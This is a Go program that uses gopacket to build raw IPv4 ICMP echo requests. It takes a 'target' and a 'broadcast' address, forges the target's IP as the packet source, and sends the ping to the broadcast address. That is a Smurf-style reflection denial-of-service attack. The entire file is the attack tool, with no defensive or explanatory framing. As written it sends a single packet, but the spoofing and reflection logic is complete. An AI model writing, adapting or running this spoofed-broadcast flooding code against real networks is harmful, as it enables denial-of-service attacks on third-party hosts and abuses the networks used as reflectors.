package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	_"github.com/google/gopacket/pcap"
	"golang.org/x/net/ipv4"
)
func init() {
	// initialize global pseudo random generator
	rand.Seed(time.Now().Unix())
}

func createHeader(header *layers.IPv4, src net.IP, dst net.IP) {
	header.Version = 0x04
	header.IHL = 0x05
	header.TOS = 0x00
	//header.Length = 0x14 //placeholder
	header.Id = uint16(rand.Intn(0xffff))
	header.Flags = layers.IPv4DontFragment
	header.FragOffset = 0x00
	header.TTL = 0x40
	header.Protocol = layers.IPProtocolICMPv4
	header.SrcIP = src
	header.DstIP = dst
}

func createICMP(packet *layers.ICMPv4) {
	packet.TypeCode = layers.CreateICMPv4TypeCode(8,0)
//	packet.Checksum = 0x00 //placeholder
	packet.Id = 0x00
	packet.Seq = 0x0100
}

func createPayload() gopacket.Payload {
	payload := []byte("Hello there")
	return payload
}

func start(src net.IP, dest net.IP) {
	var (
		header layers.IPv4
		packet layers.ICMPv4
		packetConn net.PacketConn
		payload gopacket.Payload
		rawConn *ipv4.RawConn
	)
	createHeader(&header, src, dest)
	createICMP(&packet)
	payload = createPayload()
	ipHeaderBuf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions {
		FixLengths: true,
		ComputeChecksums: true,
	}
	var err error
	if err = header.SerializeTo(ipHeaderBuf, opts); err != nil {
		fmt.Println(err)
		return
	}
	ipHeader, err := ipv4.ParseHeader(ipHeaderBuf.Bytes())
	if err != nil {
		fmt.Println(err)
		return
	}
	payloadBuf := gopacket.NewSerializeBuffer()
	if err = gopacket.SerializeLayers(payloadBuf, opts, &packet, payload); err != nil {
		fmt.Println(err)
		return
	}
	if packetConn, err = net.ListenPacket("ip4:1", "0.0.0.0"); err != nil {
		fmt.Println(err)
		return
	}
	
	if rawConn, err = ipv4.NewRawConn(packetConn); err != nil {
		
		fmt.Println(err)
		return
	}
	if err = rawConn.WriteTo(ipHeader, payloadBuf.Bytes(), nil); err != nil {
		
		fmt.Println(err)
		return
	}
	
}

func main() {
	args := os.Args
	if len(args) != 3 {
		fmt.Println("Usage: <target> <broadcast>")
		return
	}
	src := net.ParseIP(args[1])
	if src == nil {
		fmt.Println("Wrong target ip address!")
		return
	}
	dst := net.ParseIP(args[2])
	if dst == nil {
		
		fmt.Println("Wrong broadcast ip address!")
		return
	}
	start(src, dst)
}
